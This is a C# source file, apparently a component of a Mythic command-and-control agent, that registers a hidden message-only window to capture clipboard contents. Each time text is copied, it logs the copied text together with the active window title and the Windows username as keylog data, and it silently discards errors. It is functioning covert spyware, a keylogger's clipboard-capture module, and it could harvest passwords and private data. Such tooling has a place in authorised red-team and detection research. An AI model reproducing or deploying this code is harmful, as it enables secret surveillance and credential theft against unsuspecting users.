using System;
using System.Text;
using System.Windows.Forms;
using static KeylogInject.Delegates;
using static KeylogInject.Native;

namespace KeylogInject
{
    public sealed class ClipboardNotification : Form
    {
        private static string _username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static PushKeylog LogMessage;
        string lastWindow = "";
        string lastClipboard = "";
        public ClipboardNotification()
        {
            
            SetParent(Handle, HWND_MESSAGE);
            
            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            try
            {
                
                if (m.Msg == WM_CLIPBOARDUPDATE)
                {

                    
                    IntPtr active_window = GetForegroundWindow();
                    if (active_window != IntPtr.Zero && active_window != null)
                    {
                        int length = GetWindowTextLength(active_window);
                        StringBuilder sb = new StringBuilder(length + 1);
                        GetWindowText(active_window, sb, sb.Capacity);
                        string clipboardMessage = "";
                        string curWindow = sb.ToString();
                        try
                        {
                            clipboardMessage = $"[ctrl-C] Clipboard Copied: {Clipboard.GetText()}[/ctrl-C]";
                        }
                        catch (Exception ex)
                        {
                            clipboardMessage = "[ERROR]Couldn't get text from clipboard.[/ERROR]";
                        }
                        if (clipboardMessage != lastClipboard || lastWindow != curWindow)
                        {
                            lastClipboard = clipboardMessage;
                            lastWindow = curWindow;
                            LogMessage(new PhantomInterop.Structs.MythicStructs.KeylogInformation
                            {
                                Username = _username,
                                WindowTitle = sb.ToString(),
                                Keystrokes = clipboardMessage
                            });
                        }
                    }
                }
                
                base.WndProc(ref m);
            }
            catch (Exception ex)
            {
                
                
            }
        }

    }
}
